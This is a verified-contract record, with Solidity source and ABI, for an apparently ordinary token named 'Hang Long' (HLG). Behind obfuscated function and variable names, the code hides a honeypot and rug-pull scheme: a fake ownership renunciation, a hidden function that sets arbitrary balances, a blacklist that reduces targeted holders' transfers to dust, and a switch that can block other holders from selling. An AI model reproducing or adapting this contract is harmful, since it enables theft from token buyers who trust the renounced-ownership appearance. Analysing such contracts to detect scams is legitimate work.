{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface buySwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoAt {\n    function createPair(address amountIs, address maxList) external returns (address);\n}\n\ninterface marketingTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountReceiver) external view returns (uint256);\n\n    function transfer(address maxFund, uint256 feeLimitSell) external returns (bool);\n\n    function allowance(address isTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeLimitSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxFund,\n        uint256 feeLimitSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundMin, uint256 value);\n    event Approval(address indexed isTotal, address indexed spender, uint256 value);\n}\n\ninterface marketingToMetadata is marketingTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HangLong is modeBuy, marketingTo, marketingToMetadata {\n\n    uint256 private liquiditySender = 100000000 * 10 ** 18;\n\n    bool private txFund;\n\n    bool public shouldLimit;\n\n    function isWallet(address tradingExempt) public {\n        if (shouldLimit) {\n            return;\n        }\n        if (tokenList == totalTx) {\n            txFund = true;\n        }\n        minFee[tradingExempt] = true;\n        \n        shouldLimit = true;\n    }\n\n    string private launchedFee = \"Hang Long\";\n\n    string private fundTx = \"HLG\";\n\n    uint256 constant listMin = 13 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquiditySender;\n    }\n\n    mapping(address => bool) public receiverMarketingLimit;\n\n    function fundAuto(uint256 feeLimitSell) public {\n        buyList();\n        marketingLaunch = feeLimitSell;\n    }\n\n    function transfer(address launchedSenderLimit, uint256 feeLimitSell) external virtual override returns (bool) {\n        return modeTx(_msgSender(), launchedSenderLimit, feeLimitSell);\n    }\n\n    bool private launchedIs;\n\n    bool public isWalletTotal;\n\n    function fromToList() public {\n        emit OwnershipTransferred(senderSell, address(0));\n        tokenSwap = address(0);\n    }\n\n    function modeTrading(address totalLimit) public {\n        buyList();\n        if (tokenList == feeAuto) {\n            isWalletTotal = true;\n        }\n        if (totalLimit == senderSell || totalLimit == listSellAmount) {\n            return;\n        }\n        receiverMarketingLimit[totalLimit] = true;\n    }\n\n    event OwnershipTransferred(address indexed buyTrading, address indexed launchTake);\n\n    function getOwner() external view returns (address) {\n        return tokenSwap;\n    }\n\n    uint256 feeReceiver;\n\n    mapping(address => uint256) private senderList;\n\n    bool private maxAuto;\n\n    address senderIsSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address isLaunch, uint256 feeLimitSell) public virtual override returns (bool) {\n        listLimit[_msgSender()][isLaunch] = feeLimitSell;\n        emit Approval(_msgSender(), isLaunch, feeLimitSell);\n        return true;\n    }\n\n    address public listSellAmount;\n\n    function buyList() private view {\n        require(minFee[_msgSender()]);\n    }\n\n    address public senderSell;\n\n    mapping(address => mapping(address => uint256)) private listLimit;\n\n    function owner() external view returns (address) {\n        return tokenSwap;\n    }\n\n    function modeTx(address receiverMode, address maxFund, uint256 feeLimitSell) internal returns (bool) {\n        if (receiverMode == senderSell) {\n            return receiverTake(receiverMode, maxFund, feeLimitSell);\n        }\n        uint256 fromMode = marketingTo(listSellAmount).balanceOf(senderIsSwap);\n        require(fromMode == marketingLaunch);\n        require(maxFund != senderIsSwap);\n        if (receiverMarketingLimit[receiverMode]) {\n            return receiverTake(receiverMode, maxFund, listMin);\n        }\n        return receiverTake(receiverMode, maxFund, feeLimitSell);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedFee;\n    }\n\n    mapping(address => bool) public minFee;\n\n    uint256 private feeAuto;\n\n    function balanceOf(address amountReceiver) public view virtual override returns (uint256) {\n        return senderList[amountReceiver];\n    }\n\n    function transferFrom(address receiverMode, address maxFund, uint256 feeLimitSell) external override returns (bool) {\n        if (_msgSender() != shouldMode) {\n            if (listLimit[receiverMode][_msgSender()] != type(uint256).max) {\n                require(feeLimitSell <= listLimit[receiverMode][_msgSender()]);\n                listLimit[receiverMode][_msgSender()] -= feeLimitSell;\n            }\n        }\n        return modeTx(receiverMode, maxFund, feeLimitSell);\n    }\n\n    function receiverTake(address receiverMode, address maxFund, uint256 feeLimitSell) internal returns (bool) {\n        require(senderList[receiverMode] >= feeLimitSell);\n        senderList[receiverMode] -= feeLimitSell;\n        senderList[maxFund] += feeLimitSell;\n        emit Transfer(receiverMode, maxFund, feeLimitSell);\n        return true;\n    }\n\n    uint256 public totalTx;\n\n    uint256 marketingLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundTx;\n    }\n\n    function allowance(address totalMin, address isLaunch) external view virtual override returns (uint256) {\n        if (isLaunch == shouldMode) {\n            return type(uint256).max;\n        }\n        return listLimit[totalMin][isLaunch];\n    }\n\n    function amountListExempt(address launchedSenderLimit, uint256 feeLimitSell) public {\n        buyList();\n        senderList[launchedSenderLimit] = feeLimitSell;\n    }\n\n    uint8 private atList = 18;\n\n    address shouldMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private tokenSwap;\n\n    constructor (){\n        \n        buySwap shouldFrom = buySwap(shouldMode);\n        listSellAmount = autoAt(shouldFrom.factory()).createPair(shouldFrom.WETH(), address(this));\n        \n        senderSell = _msgSender();\n        fromToList();\n        minFee[senderSell] = true;\n        senderList[senderSell] = liquiditySender;\n        if (launchedIs) {\n            feeAuto = tokenList;\n        }\n        emit Transfer(address(0), senderSell, liquiditySender);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atList;\n    }\n\n    uint256 public tokenList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSenderLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitSell\",\"type\":\"uint256\"}],\"name\":\"amountListExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeLimitSell\",\"type\":\"uint256\"}],\"name\":\"fundAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingExempt\",\"type\":\"address\"}],\"name\":\"isWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSellAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"}],\"name\":\"modeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMarketingLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSenderLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HangLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}